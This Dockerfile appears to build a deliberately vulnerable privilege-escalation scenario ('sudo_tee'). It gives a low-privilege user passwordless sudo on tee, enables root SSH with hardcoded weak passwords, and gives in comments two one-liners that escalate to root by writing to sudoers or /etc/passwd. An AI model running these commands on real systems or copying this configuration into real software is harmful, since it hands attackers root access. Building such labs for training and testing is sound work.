FROM debian:bookworm-slim

# ============================================================
# PrivEscalate Scenario: sudo_tee
# ATT&CK: T1548.003 | CWE: CWE-269
# Vulnerability: sudo misconfiguration allows running /usr/bin/tee as root
# ============================================================

ENV DEBIAN_FRONTEND=noninteractive

# Install SSH server, sudo, and coreutils (tee is part of coreutils)
RUN apt-get update && \
    apt-get install -y \
        openssh-server \
        sudo \
        coreutils \
    && rm -rf /var/lib/apt/lists/* \
    && mkdir -p /run/sshd

# Verify tee is installed
RUN which tee && ls -la /usr/bin/tee

# Create low-privilege user
RUN useradd -m -s /bin/bash lowpriv && \
    echo "lowpriv:password123" | chpasswd

# --- Configure sudo vulnerability ---
# tee can write to arbitrary files when run as root. The exploit approach:
#   echo "lowpriv ALL=(ALL) NOPASSWD: ALL" | sudo tee /etc/sudoers.d/escalate
# Or overwrite /etc/passwd with a root-equivalent user entry:
#   echo 'hacker::0:0::/root:/bin/bash' | sudo tee -a /etc/passwd
RUN echo "lowpriv ALL=(root) NOPASSWD: /usr/bin/tee" > /etc/sudoers.d/tee && \
    chmod 440 /etc/sudoers.d/tee

# Verify sudo configuration
RUN visudo -c

# Keep SUID on sudo
RUN chmod u+s /usr/bin/sudo

# Configure SSH
RUN sed -i 's/#PermitRootLogin.*/PermitRootLogin yes/' /etc/ssh/sshd_config && \
    sed -i 's/#PasswordAuthentication.*/PasswordAuthentication yes/' /etc/ssh/sshd_config && \
    echo "root:aim8Du7h" | chpasswd

EXPOSE 22
CMD ["/usr/sbin/sshd", "-D"]